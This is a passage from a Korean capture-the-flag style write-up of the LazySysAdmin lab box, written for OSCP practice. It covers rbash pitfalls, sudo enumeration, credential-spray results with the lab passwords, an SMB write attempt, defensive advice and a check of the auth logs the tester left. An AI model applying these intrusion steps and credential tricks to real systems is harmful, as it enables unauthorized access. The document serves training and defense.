**① `scp` 가 조용히 끊겼다** — `harvest.sh` 를 올리려는데 `scp: Connection closed`. 방화벽이나 권한 문제로 읽기 쉬운데 아니다. `scp -O` (대문자 O, legacy SCP 프로토콜 강제)로 즉시 해결됐다.

원인은 이때는 몰랐고 rbash 정체를 파악한 뒤에 맞춰졌다. 최신 OpenSSH 의 `scp` 는 기본으로 **SFTP 서브시스템**을 쓴다. `sshd_config` 에는 `Subsystem sftp /usr/lib/openssh/sftp-server` 가 정상 등재돼 있었는데, sshd 는 외부 서브시스템을 **사용자의 로그인 셸에 `-c` 로 넘겨** 실행한다. 그 셸이 rbash라 `/usr/lib/openssh/sftp-server` 에 `/` 가 들어 있다는 이유로 거부하고 연결이 끊긴다. `sftp` 를 직접 붙여보면 같은 증상이 재현된다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ sshpass -p '12345' sftp -o StrictHostKeyChecking=no togie@192.168.248.36 <<< 'ls'
##################################################################################################

Connection closed.  
Connection closed
```

`-O` 가 통한 이유도 같은 규칙으로 설명된다 — legacy 모드는 원격에서 `scp -t <경로>` 를 실행하고, **명령 이름 `scp` 에는 `/` 가 없다.** rbash 는 인자의 슬래시가 아니라 명령 이름의 슬래시만 본다.

**구형 리눅스 박스에 파일이 안 올라가면 `-O` 를 먼저 때려보고, 그래도 안 되면 로그인 셸을 의심하라.** 나머지 대안 `cat file | ssh user@host 'cat > /tmp/x'` 는 여기서 rbash 가 `>` 를 막아 어차피 실패했을 것이다.

**② rbash 를 방화벽으로 오독할 뻔했다** — `sh /tmp/.h.sh >/dev/null` 이 `rbash: /dev/null: restricted` 를 뱉었을 때 처음 든 생각은 "파일이 안 올라갔나"였다. 실제로는 파일은 멀쩡히 올라가 있었고(`ls -la /tmp/.h.sh` 로 확인) 셸이 리다이렉션을 거부한 것이다. **에러 메시지의 앞부분(`rbash:`)을 읽어라** — 어느 계층이 거부했는지가 프롬프트 이름에 적혀 있다.

**③ `sudo -n -l` 이 빈손이었다** — 열거 스크립트의 SUDO 섹션이 `sudo: a password is required` 한 줄로 끝난다. 이 출력만 보면 "sudo 경로 없음"으로 읽히는데, 실제 답은 `(ALL : ALL) ALL` 이었다.

여기서 나를 구한 건 첫 SSH 의 `id` 였다. `27(sudo)` 를 보고 곧장 `echo 12345 | sudo -S -l` 로 다시 쳤고, 그래서 `harvest.sh` 의 빈손 출력을 볼 일 자체가 없었다(4장 시각표 — 스크립트는 root 를 잡은 뒤에야 돌았다). 순서가 반대였다면 그대로 막혔을 것이다.

**`sudo -n` 의 의미를 정확히 읽어라.** `-n` 은 "비밀번호 프롬프트를 절대 띄우지 말라"는 뜻이다. 인증이 필요한 상태면 목록을 걸러서 보여주는 게 아니라 **아예 물어보지 못하고 `a password is required` 로 죽는다.** "항목이 없다"가 아니라 "못 물어봤다"이다. 비번을 이미 아는 상황이면 반드시 `echo '<pw>' | sudo -S -l` 로 다시 쳐라. (이 때문에 `~/PG/_lib/harvest.sh` 에 `HARVEST_PW` 환경변수를 넣어 `sudo -S -l` 을 추가로 돌리도록 고쳤다.)

**④ 웹에 적힌 사용자명을 못 보고 SMB 로 돌아갔다** — `curl` 로 받은 `wp_home.html` 에 `grep -o -E '.{60}togie.{60}'` 을 돌렸더니 **0건**이 나왔다. "웹에는 togie 언급이 없다"고 결론냈는데 틀렸다. 실제로는 56건 있었다. `grep -o` 의 `.{60}` 앞뒤 문맥 요구가 **행 시작/끝에 걸린 매치를 전부 탈락**시킨 것이다. 스크린샷을 눈으로 보고서야 `My name is togie.` 를 발견했다. **부재를 확인할 때는 문맥 없는 단순 패턴(`grep -c -i togie`)으로 먼저 세라.** 문맥 패턴은 확인용이지 존재 판정용이 아니다.

**⑤ `enum4linux -U` 가 빈 결과** — 사용자 열거를 붙였는데 이렇게 나왔다.

```
 ======================================( Users on 192.168.248.36 )======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.
```

Perl 경고까지 뱉으며 아무것도 안 나온다. 이걸 "사용자 열거 불가"로 읽으면 안 된다. Samba 의 `querydispinfo`/`enumdomusers` 가 Unix 계정을 노출하지 않는 구성일 뿐이고, **`rpcclient` SID 역조회는 여전히 통한다**(1장). 도구 하나가 빈손이면 같은 정보를 다른 RPC 로 물어라.

**⑥ SMB 공유 쓰기 시도** — 웹루트가 통째로 읽히니 PHP 웹셸을 올리는 게 첫 후보였다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ smbclient //192.168.248.36/share\$ -N -c 'put /tmp/lsa_wtest.txt lsa_wtest.txt'
NT_STATUS_ACCESS_DENIED opening remote file \lsa_wtest.txt
```

읽기 전용이었다. 이게 통했으면 SSH 없이 웹셸로 끝났겠지만 — **OSCP 에서는 웹셸로 읽은 플래그가 0점**이므로 어차피 셸을 따로 올려야 했다.

**⑦ MySQL 원격 접속** — `Admin:TogieMYSQL12345^^` 를 3306 에 직접 던졌다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ mysql -h 192.168.248.36 -u Admin -p'TogieMYSQL12345^^' -e 'select 1'
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.207' is not allowed to connect to this MySQL server
```

에러 1130 = **호스트 기반 거부**. 비번이 틀린 게 아니다(1045 였으면 자격증명 문제). `wp-config.php` 의 `DB_HOST` 가 `localhost` 인 것과 일치한다. nmap 이 `MySQL (unauthorized)` 로 적은 것도 같은 현상을 본 것이다. **1130 과 1045 를 구분하라** — 전자는 피벗해서 다시 오면 되고, 후자는 비번을 더 찾아야 한다.

**⑧ 자격증명 조합 정리** — 넷을 다 때려봤다.

| 조합 | 결과 |
|---|---|
| `ssh togie:12345` | **성공** |
| `ssh togie:TogieMYSQL12345^^` | `Permission denied (publickey,password).` |
| `POST wp-login.php log=Admin&pwd=TogieMYSQL12345^^` | `HTTP/1.1 302 Found` → `Location: .../wp-admin/` — **성공** |
| `POST wp-login.php log=togie&pwd=12345` | `HTTP/1.1 200 OK` (로그인 폼 재출력 = 실패) |

WordPress 로그인 판정은 **상태 코드로 한다.** 성공은 `302` + `Location: wp-admin/`, 실패는 `200` 으로 폼을 다시 그린다. 본문 길이나 "Error" 문자열을 찾을 필요가 없다.

`Admin` 으로 wp-admin 에 들어갈 수 있었으니 **Appearance → Theme Editor 로 PHP 를 심는 대체 foothold** 가 존재했다. SSH 가 더 빨라서 안 갔다.

## 7. OSCP 시험 관점

1. **널 세션 SMB 를 발견하면 다른 걸 다 멈추고 먼저 훑어라.** `smbclient -L //T -N` → 읽히는 공유마다 `-c 'recurse ON; ls'`. 여기서는 3분 만에 끝났는데, 웹 디렉터리 버스팅부터 시작했으면 30분을 태웠을 것이다.
2. **웹루트가 파일 공유로 노출되면 `*.php` 설정파일이 1순위다.** `wp-config.php`·`configuration.php`(Joomla)·`settings.php`(Drupal)·`local_settings.py`·`.env`·`web.config`. WordPress 면 `wp-config.php` 하나로 DB 자격증명이 끝난다.
3. **`sudo -l` 을 두 번 쳐라.** 비번 모를 때 `sudo -n -l`(블로킹 없음), 비번 알면 `echo '<pw>' | sudo -S -l`. 자동 열거 스크립트는 대개 전자만 돌리므로 **후자를 손으로 보충하는 게 네 몫**이다.
4. **`id` 의 보조 그룹을 읽어라.** `27(sudo)`·`4(adm)`(로그 읽기)·`docker`·`lxd`·`disk`·`shadow` 는 전부 그 자체로 권한상승 후보다. 여기서는 첫 `id` 출력에 이미 답이 있었다.
5. **제한 셸은 PATH 로 판정한다.** `echo $PATH` 가 평범하면 감옥이 아니라 문패다. PATH 가 좁으면 그때부터 GTFOBins 를 뒤져라.
6. **수동 대안** — 이 박스는 처음부터 끝까지 `smbclient`·`rpcclient`·`ssh`·`sudo` 뿐이다. 자동 도구가 하나도 필요 없었다. `enum4linux` 를 썼지만 그것마저 빈손이었고, 결정적 정보는 `rpcclient` 한 줄에서 나왔다.
7. **시간 배분** — Fundamental 난이도의 리눅스 박스에서 **20분 안에 자격증명 후보가 안 나오면 열거를 놓친 것**이다. 포트마다 인증 없는 열거(SMB `-N`, FTP anonymous, NFS `showmount -e`, SNMP public, LDAP anonymous bind)를 다 돌았는지 되짚어라. 웹 디렉터리 버스팅은 그 다음이다.

## 8. 방어 관점

- Samba 공유가 웹루트를 가리키지 않게 한다. 불가피하면 `guest ok = no` + `valid users` 로 익명 접근을 끊는다. 이 박스의 `share$` 는 `-N` 으로 읽혔다.
- `wp-config.php` 를 문서 루트 밖(`../`)에 두거나 최소한 `chmod 640` + 웹 서버 사용자만 읽게 한다. 파일 공유로 노출되는 순간 DB 자격증명은 공개 정보다.
- `deets.txt` 같은 비번 메모를 서버에 두지 않는다. `todolist.txt` 가 "고칠 예정"이라고 적혀 있었다는 것 자체가 위험의 지표다.
- `togie` 를 `sudo` 그룹에서 빼거나, 필요한 명령만 `sudoers` 에 개별 등재한다. `(ALL : ALL) ALL` + 5자리 숫자 비번은 사실상 root 계정을 하나 더 만든 것이다.
- 제한 셸을 쓸 거면 PATH 를 화이트리스트 디렉터리 하나로 좁히고 거기에 허용 바이너리만 심볼릭 링크한다. PATH 를 안 좁힌 rbash 는 보안 장치가 아니다.
- MySQL 이 `bind-address = 0.0.0.0` 이라 3306 이 외부에 열려 있었다. 접근은 호스트 ACL 로 막혔지만 노출 자체를 줄이는 게 낫다.

## 9. 참고 자료

- GTFOBins — 제한 셸 탈출에 쓸 수 있는 바이너리 목록: https://gtfobins.github.io/#+shell
- `rpcclient` SID 네임스페이스: Samba 의 `S-1-22-1-<uid>` = Unix 사용자, `S-1-22-2-<gid>` = Unix 그룹
- 이 박스는 VulnHub 의 LazySysAdmin 1.0 을 PG 가 재포장한 것이다. 원판과 달리 **`togie` 의 셸이 `/bin/rbash`** 이고 플래그가 `local.txt`/`proof.txt` 로 바뀌어 있다.

## 남긴 흔적

정리하고 **직접 확인한 것**:
- `/tmp/.h.sh`(업로드한 `harvest.sh`) · `/tmp/.h/`(수집 출력) · `/tmp/zz`(rbash 탈출 테스트 파일) → 삭제. 삭제 후 `ls -la /tmp` 가 `vmware-root` 만 남은 것을 확인했다.
- 파일 생성·설정 변경·계정 추가는 없다. 리버스셸을 안 썼으므로 Kali 리스너도 tmux 세션(`lsa_nmap`, nmap 용)도 페이로드를 남기지 않았다.
- SMB 쓰기 테스트(`lsa_wtest.txt`)는 `ACCESS_DENIED` 로 실패했으므로 타겟에 파일이 생기지 않았다.

### 로그에 남긴 것 — 지우지 않았고, 대신 세어봤다

박스가 살아 있는 동안 root 로 되돌아가 실제로 뭐가 남았는지 세었다. `traces_confirmed.log` 원문이다.

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         # 
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

[sudo] password for togie: ===AUTHLOG_COUNT===
68
===AUTHLOG_SAMPLE===
Aug 20 17:43:40 LazySysAdmin sshd[1697]: Did not receive identification string from 192.168.45.207
Aug 20 17:43:55 LazySysAdmin sshd[1704]: Protocol major versions differ for 192.168.45.207: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8 vs. SSH-1.5-Nmap-SSH1-Hostkey
Aug 20 17:43:55 LazySysAdmin sshd[1705]: Protocol major versions differ for 192.168.45.207: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8 vs. SSH-1.5-NmapNSE_1.0
Aug 20 17:43:56 LazySysAdmin sshd[1710]: Connection closed by 192.168.45.207 [preauth]
Aug 20 17:43:56 LazySysAdmin sshd[1715]: Connection closed by 192.168.45.207 [preauth]
Aug 20 17:43:57 LazySysAdmin sshd[1718]: Connection closed by 192.168.45.207 [preauth]
===AUTHLOG_TAIL===
Aug 20 18:22:04 LazySysAdmin sshd[3464]: Received disconnect from 192.168.45.207: 11: disconnected by user
Aug 20 18:22:04 LazySysAdmin sshd[3416]: pam_unix(sshd:session): session closed for user togie
Aug 20 18:22:33 LazySysAdmin sshd[3466]: Accepted password for togie from 192.168.45.207 port 53112 ssh2
Aug 20 18:22:33 LazySysAdmin sshd[3466]: pam_unix(sshd:session): session opened for user togie by (uid=0)
Aug 20 18:22:33 LazySysAdmin sudo:    togie : TTY=unknown ; PWD=/home/togie ; USER=root ; COMMAND=/bin/sh -c echo ===AUTHLOG_COUNT===; grep -c 192.168.45.207 /var/log/auth.log; echo ===AUTHLOG_SAMPLE===; grep 192.168.45.207 /var/log/auth.log | head -6; echo ===AUTHLOG_TAIL===; tail -6 /var/log/auth.log; echo ===SUDO_LINES===; grep -c "sudo:.*togie" /var/log/auth.log; grep "sudo:.*togie" /var/log/auth.log | head -3; echo ===LAST_WTMP===; last -a | head -10; echo ===BTMP===; lastb -a 2>/dev/null | head -5; echo ===BASH_HISTORY===; ls -la /home/togie/.bash_history; wc -c /home/togie/.bash_history; echo ===HISTCONTENT===; cat -A /home/togie/.bash_history | head -5; echo ===END===
Aug 20 18:22:33 LazySysAdmin sudo: pam_unix(sudo:session): session opened for user root by (uid=0)
===SUDO_LINES===
14
Aug 20 17:45:34 LazySysAdmin sudo:    togie : a password is required ; TTY=unknown ; PWD=/home/togie ; USER=root ; COMMAND=list
Aug 20 17:45:40 LazySysAdmin sudo:    togie : TTY=unknown ; PWD=/home/togie ; USER=root ; COMMAND=list
Aug 20 17:45:50 LazySysAdmin sudo:    togie : TTY=pts/0 ; PWD=/home/togie ; USER=root ; COMMAND=/bin/bash -c bash -c whoami;\ id;\ hostname;\ hostname\ -I;\ date;\ ls\ -la\ /root;\ cat\ /root/proof.txt
===LAST_WTMP===
togie    pts/0        Thu Aug 20 17:45 - 17:45  (00:00)     192.168.45.207
togie    pts/0        Thu Aug 20 17:45 - 17:45  (00:00)     192.168.45.207
reboot   system boot  Sun Aug  4 03:55 - 18:22 (746+14:26)  4.4.0-31-generic
root     tty1         Thu Jul  9 22:34 - down   (00:17)     
reboot   system boot  Thu Jul  9 22:33 - 22:51  (00:17)     4.4.0-31-generic

wtmp begins Thu Jul  9 22:33:51 2020
===BTMP===
togie    ssh:notty    Thu Aug 20 17:47 - 17:47  (00:00)     192.168.45.207

btmp begins Thu Aug 20 17:47:14 2026
===BASH_HISTORY===
-rw------- 1 togie togie 0 Mar  5  2020 /home/togie/.bash_history
0 /home/togie/.bash_history
===HISTCONTENT===
===END===
```

읽어야 할 것 넷.

**① `sudo` 는 실행 명령을 `COMMAND=` 에 인자까지 통째로 남긴다.** 17:45:50 행에 `cat /root/proof.txt` 가 그대로 박혀 있다 — 플래그를 어떻게 읽었는지가 타겟 로그에 문장으로 남는다는 뜻이다. 비번을 명령 인자로 넘기는 습관이 있으면 그것도 같은 자리에 남는다. 이건 시험보다 실무 쪽에서 더 값나가는 관찰이다.

**② `wtmp` 의 `togie pts/0` 는 2건뿐이고 둘 다 17:45 다.** `ssh -tt` 로 플래그를 읽은 그 두 번이다. 비대화형 `ssh <cmd>` 는 pty 를 안 여니 `wtmp` 에 안 남는다 — 실제 작업량에 비해 `last` 가 조용한 이유다. `auth.log` 는 반대로 68행 다 세고 있다. **어느 로그를 보느냐로 결론이 갈린다.**

**③ `btmp` 에 실패 로그인 1건, 17:47.** 6장 ⑧의 `togie:TogieMYSQL12345^^` 시도다. 자격증명 조합을 때려보면 실패도 그대로 남는다.

**④ `~togie/.bash_history` 는 0바이트 그대로다**(mtime 2020-03-05). 내 명령은 한 줄도 안 들어갔다 — 전부 비대화형이었기 때문이다. 이건 이제 `[가정]` 이 아니라 확인된 사실이다.

**로그는 지우지 않았다.** 「남긴 흔적」이 요구하는 건 지우는 게 아니라 **내가 무엇을 남겼는지 알고 적는 것**이다. 로그 삭제는 흔적을 줄이는 게 아니라 더 남기고(크기·mtime 변화, 삭제 행위 자체가 감사 대상) 되돌릴 수도 없다. PG 랩에서는 할 이유도 없다.

그리고 **이 흔적 확인 작업 자체가 `auth.log` 에 `sudo` 2행을 더 얹었다.** 위 `===AUTHLOG_TAIL===` 의 18:22:33 항목이 그것이고, `sudo` 로 로그를 읽었으니 그 `grep` 명령 전문까지 `COMMAND=` 에 찍혔다. 따라서 `68` 과 `14` 는 **이 확인 실행분을 포함한 숫자**다. 관측이 관측 대상을 바꾸는 자리라 빼지 않고 그대로 적어둔다.

**확인하지 않은 것**:
- Apache 액세스 로그(`/var/log/apache2/access.log`)에 남았을 `curl`·`wp-login.php` POST 기록 — 보지 않았다.
- Samba 로그(`/var/log/samba/`)에 남았을 널 세션·`recurse ON; ls`·쓰기 실패 기록 — 보지 않았다.
- MySQL 의 1130 거부 기록 — 보지 않았다.

## 관련 노트

- [[Sorcerer]] — 같은 "접속은 되는데 셸이 갇혀 있다" 부류. 저쪽은 `authorized_keys` 의 `command=` 강제 명령, 이쪽은 `/etc/passwd` 의 `rbash`. **로그인이 됐는데 뭔가 안 되면 셸 자체를 의심하라**는 반사가 같다.
- [[_STATUS]] — 283개 전수 진행현황
